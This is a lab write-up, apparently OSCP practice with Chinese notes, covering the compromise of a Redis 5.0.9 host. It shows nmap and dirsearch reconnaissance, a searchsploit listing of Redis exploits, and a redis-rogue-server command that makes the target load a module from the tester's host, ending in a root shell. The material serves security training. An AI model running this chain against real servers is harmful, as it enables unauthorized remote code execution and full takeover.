## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ sudo nmap -A -sV -sS -T4 192.168.156.69
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-15 22:50 CST
Nmap scan report for 192.168.156.69
Host is up (0.26s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
53/tcp   closed domain
80/tcp   open   http       nginx 1.10.3
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3
8080/tcp open   http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=WN2auJsVYruXfpFC4wED7IBJ; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-MeNq6M19ZfqhjBIhMxiyILgvm0E"
|     Vary: Accept-Encoding
|     Date: Tue, 15 Aug 2023 14:50:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=PTO3K_Ioza3Sy4g9aRypEvDK; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-zLvztVpA0jRN+tnwQUwPRJPVHd0"
|     Vary: Accept-Encoding
|     Date: Tue, 15 Aug 2023 14:50:32 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Tue, 15 Aug 2023 14:50:35 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
| http-robots.txt: 3 disallowed entries
|_/admin/ /reset/ /compose
|_http-title: Home | NodeBB
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=8/15%Time=64DB90BA%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,48E6,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\
SF:x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noop
SF:en\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20
SF:mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-
SF:Powered-By:\x20NodeBB\r\nset-cookie:\x20_csrf=PTO3K_Ioza3Sy4g9aRypEvDK;
SF:\x20Path=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
SF:ength:\x2018181\r\nETag:\x20W/\"4705-zLvztVpA0jRN\+tnwQUwPRJPVHd0\"\r\n
SF:Vary:\x20Accept-Encoding\r\nDate:\x20Tue,\x2015\x20Aug\x202023\x2014:50
SF::32\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x
SF:20lang=\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x2
SF:0\x20>\r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x2
SF:0name=\"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-sca
SF:le&#x3D;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"tex
SF:t/html;\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-ap
SF:p-capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\
SF:"\x20content")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefe
SF:tch-Control:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Opt
SF:ions:\x20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protecti
SF:on:\x201;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross
SF:-origin\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Typ
SF:e:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W
SF:/\"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:
SF:\x20Tue,\x2015\x20Aug\x202023\x2014:50:35\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1
SF:\x20404\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type
SF:-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferr
SF:er-Policy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeB
SF:B\r\nset-cookie:\x20_csrf=WN2auJsVYruXfpFC4wED7IBJ;\x20Path=/\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nE
SF:Tag:\x20W/\"2b5a-MeNq6M19ZfqhjBIhMxiyILgvm0E\"\r\nVary:\x20Accept-Encod
SF:ing\r\nDate:\x20Tue,\x2015\x20Aug\x202023\x2014:50:36\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20d
SF:ata-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\
SF:t<title>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewp
SF:ort\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\
SF:"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20ch
SF:arset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x
SF:20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20
SF:content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n");
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 4.4 (93%), Linux 3.16 (90%), Linux 3.13 (90%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (88%), Linux 2.6.32 (88%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), WatchGuard Fireware 11.8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   282.12 ms 192.168.45.1
2   282.13 ms 192.168.45.254
3   282.20 ms 192.168.251.1
4   282.16 ms 192.168.156.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.24 seconds
```

Dirsearch
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ dirsearch -u http://192.168.156.69:8080/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: 4761.pl | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.156.69-8080/-_23-08-15_22-56-05.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-08-15_22-56-05.log

Target: http://192.168.156.69:8080/

[22:56:06] Starting:
[22:56:46] 302 -   36B  - /ADMIN  ->  /login?local=1
[22:56:46] 302 -   36B  - /Admin/knowledge/dsmgr/users/GroupManager.asp  ->  /login?local=1
[22:56:46] 302 -   36B  - /Admin  ->  /login?local=1
[22:56:47] 302 -   36B  - /Admin/knowledge/dsmgr/users/UserManager.asp  ->  /login?local=1
[22:56:47] 302 -   36B  - /Admin/login/  ->  /login?local=1
[22:57:12] 302 -   36B  - /admin  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/access-log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/error.log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/err.log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/.htaccess  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/login.txt  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/access_log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/error_log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/access.log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/_logs/error-log  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/.config  ->  /login?local=1
[22:57:13] 302 -   36B  - /admin/?/login  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/account  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/access_log  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin/login  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin_login.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin_login  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin-login  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/admin-login.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/adminLogin.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/backup/  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/adminLogin  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/account.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/config.php  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/access.txt  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/backups/  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/download.php  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/cp.4761.pl  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/default.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/default/login.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/default/admin.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/access.log  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/db/  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/dumper/  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/error.log  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/default  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/error.txt  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/cp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/controlpanel  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/php/connector.php  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/error_log  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/php/upload.php  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/FCKeditor  ->  /login?local=1
[22:57:14] 302 -   36B  - /admin/controlpanel.4761.pl  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/files.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/includes/configure.php~  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/home  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/file.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/fckeditor/editor/filemanager/upload/php/upload.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/index  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/index.4761.pl  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/export.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/home.4761.pl  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/js/tinymce/  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/js/tinymce  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/js/tiny_mce/  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/js/tiny_mce  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.4761.pl  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.jsp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.rb  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logon.jsp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.htm  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.html  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.asp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.do  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/login.py  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/access-log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/access_log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/manage  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/manage.asp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/mysql/index.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/err.log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/mysql2/index.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/mysql/  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/error-log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/phpmyadmin/  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/phpMyAdmin/index.php  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/access.log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/manage/admin.asp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/error.log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/manage/login.asp  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/login.txt  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/error_log  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/logs/  ->  /login?local=1
[22:57:15] 302 -   36B  - /admin/phpMyAdmin  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/portalcollect.php?f=http://xxx&t=js  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/PMA/index.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/pMA/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/secure/logon.jsp  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/phpmyadmin/index.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/release  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/private/logs  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/pol_log.txt  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/pma/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/pma/index.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/phpmyadmin2/index.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/scripts/fckeditor  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/signin  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/user_count.txt  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/uploads.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/upload.php  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/sysadmin/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/phpMyAdmin/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/web/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/sxd/  ->  /login?local=1
[22:57:16] 302 -   36B  - /admin/sqladmin/  ->  /login?local=1
[22:57:17] 302 -   36B  - /admin/tiny_mce  ->  /login?local=1
[22:57:19] 302 -   36B  - /admin/tinymce  ->  /login?local=1
[22:57:32] 200 -    3KB - /api
[22:57:32] 200 -    3KB - /api/
[22:57:34] 301 -  179B  - /assets  ->  /assets/
[22:57:42] 200 -   19KB - /categories
[22:58:05] 200 -    1KB - /favicon.ico
[22:58:06] 500 -   11KB - /flags
[22:58:25] 200 -   11KB - /login
[22:58:25] 200 -   11KB - /login/
[22:58:29] 200 -   92B  - /manifest.json
[22:58:48] 200 -    3B  - /ping
[22:58:53] 200 -   14KB - /register
[22:58:54] 200 -  111B  - /robots.txt
[22:58:55] 200 -   12KB - /reset
[22:59:01] 200 -  307B  - /sitemap.xml
[22:59:09] 302 -   28B  - /tags  ->  /login
[22:59:13] 200 -   18KB - /top
[22:59:15] 302 -   52B  - /uploads  ->  /assets/uploads/?v=7sgruj70sic
[22:59:15] 302 -   67B  - /uploads/affwp-debug.log  ->  /assets/uploads/affwp-debug.log?v=7sgruj70sic
[22:59:15] 302 -   60B  - /uploads/dump.sql  ->  /assets/uploads/dump.sql?v=7sgruj70sic
[22:59:15] 302 -   52B  - /uploads/  ->  /assets/uploads/?v=7sgruj70sic
[22:59:15] 302 -   28B  - /user/admin.php  ->  /login
[22:59:15] 302 -   28B  - /user/signup  ->  /login
[22:59:15] 302 -   28B  - /user/login.4761.pl  ->  /login
[22:59:15] 302 -   28B  - /user/admin  ->  /login
[22:59:15] 302 -   28B  - /user/login/  ->  /login
[22:59:16] 302 -   28B  - /users  ->  /login
[22:59:16] 302 -   28B  - /users/  ->  /login
```

都沒發現有效資料
改回來 nmap all port

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ sudo nmap -p- 192.168.156.69
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-15 23:11 CST
Nmap scan report for 192.168.156.69
Host is up (0.28s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
6379/tcp  open   redis
8080/tcp  open   http-proxy
27017/tcp open   mongod

Nmap done: 1 IP address (1 host up) scanned in 561.41 seconds
```

發現 6379 port 有跑 redis

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ sudo nmap -A -sV -sS -T4 192.168.156.69 -p 6379
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-15 23:22 CST
Nmap scan report for 192.168.156.69
Host is up (0.52s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.9
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 4.4 (91%), Linux 3.2.0 (90%), Linux 3.16 (88%), Linux 3.13 (87%), Linux 3.10 - 3.16 (86%), Linux 3.10 - 4.11 (85%), Linux 3.12 (85%), Linux 3.13 or 4.2 (85%), Linux 3.16 - 4.6 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 6379/tcp)
HOP RTT       ADDRESS
1   672.14 ms 192.168.45.1
2   672.15 ms 192.168.45.254
3   672.30 ms 192.168.251.1
4   672.41 ms 192.168.156.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
```

searchsploit 發現有 47195 可利用

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/ClamAV]
└─$ searchsploit "redis"
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Redis - Replication Code Execution (Metasploit)                                            | linux/remote/48272.rb
Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                              | linux/remote/47195.rb
Redis 5.0 - Denial of Service                                                              | linux/dos/44908.txt
Redis-cli < 5.0 - Buffer Overflow (PoC)                                                    | linux/local/44904.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

但因其為 metasploit 版本，故搜尋是否有可用 PoC

[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

redis-rouge-server 可 RCE，[Github](https://github.com/n0b0dyCN/redis-rogue-server)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Wombo/redis-rogue-server]
└─$ python3 redis-rogue-server.py --rhost 192.168.156.69 --rport 6379 --lhost 192.168.45.158 --lport 6379
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.156.69:6379
[info] SERVER 192.168.45.158:6379
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[>>] root
```

若需要 reverse shell 也可以

```json

```